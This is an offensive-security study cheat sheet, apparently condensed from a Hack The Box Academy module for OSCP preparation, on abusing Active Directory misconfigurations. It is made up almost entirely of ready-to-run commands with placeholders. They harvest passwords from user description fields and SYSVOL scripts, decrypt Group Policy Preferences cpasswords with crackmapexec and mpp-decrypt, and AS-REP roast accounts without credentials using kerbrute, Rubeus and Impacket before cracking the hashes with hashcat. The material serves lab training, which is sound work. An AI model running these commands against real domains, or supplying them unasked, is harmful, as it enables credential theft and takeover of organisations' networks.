# Section 26: Miscellaneous Misconfigurations

- Module: Active Directory Enumeration & Attacks (143)
- URL: https://academy.hackthebox.com/app/module/143/section/1276
- Code/command blocks: 11

> Terminal output is omitted; only commands & scripts are captured.

> **OSCP scope:** trimmed to the high-value bits — **AS-REP roasting**, **GPP passwords**, and **credential loot spots** (descriptions / SYSVOL). Dropped the printer/spooler check (`Get-SpoolStatus`), `adidnsdump`, and GPO enumeration/ACL abuse as low-value for the exam.

## Loot: passwords left lying around

Creds in user **description** fields (classic quick win):

```powershell
Get-DomainUser * | Select-Object samaccountname,description | Where-Object {$_.Description -ne $null}
```

Accounts flagged **PASSWD_NOTREQD** (may allow a blank-password logon):

```powershell
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
```

Creds in **SYSVOL logon scripts** (readable by any domain user):

```powershell
ls \\{{MACHINE_NAME}}\SYSVOL\{{DOMAIN_UPPER}}\scripts
cat \\{{MACHINE_NAME}}\SYSVOL\{{DOMAIN_UPPER}}\scripts\reset_local_admin_pass.vbs
```

## GPP passwords (cpassword in SYSVOL)

Group Policy Preferences can store an AES-encrypted password (`cpassword`) in `Groups.xml` — the AES key is public, so it's trivially reversible.

```bash
# list the GPP-related CME modules
crackmapexec smb -L | grep gpp
```

```bash
# auto-find & decrypt GPP autologon creds
crackmapexec smb {{DC_IP}} -u {{USERNAME}} -p {{PASSWORD}} -M gpp_autologin
```

```bash
# manually decrypt a cpassword found in Groups.xml
mpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE
```

## AS-REP Roasting

Users with Kerberos **pre-auth disabled** are roastable — the DC hands you an encrypted blob you crack offline. Works **without valid creds** (Linux `-no-pass`), given a user list.

```powershell
# find roastable users (authenticated)
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
```

```bash
# build a user list first if you have no creds
kerbrute userenum -d {{DOMAIN}} --dc {{DC_IP}} {{USERLIST}} 
```

```powershell
# roast from Windows (Rubeus)
.\Rubeus.exe asreproast /user:{{USERNAME}} /nowrap /format:hashcat
```

```bash
# roast from Linux (Impacket) — no creds needed
impacket-GetNPUsers {{DOMAIN_UPPER}}/ -dc-ip {{DC_IP}} -no-pass -usersfile valid_ad_users 
```

```bash
# crack (mode 18200 = AS-REP)
hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt 
```

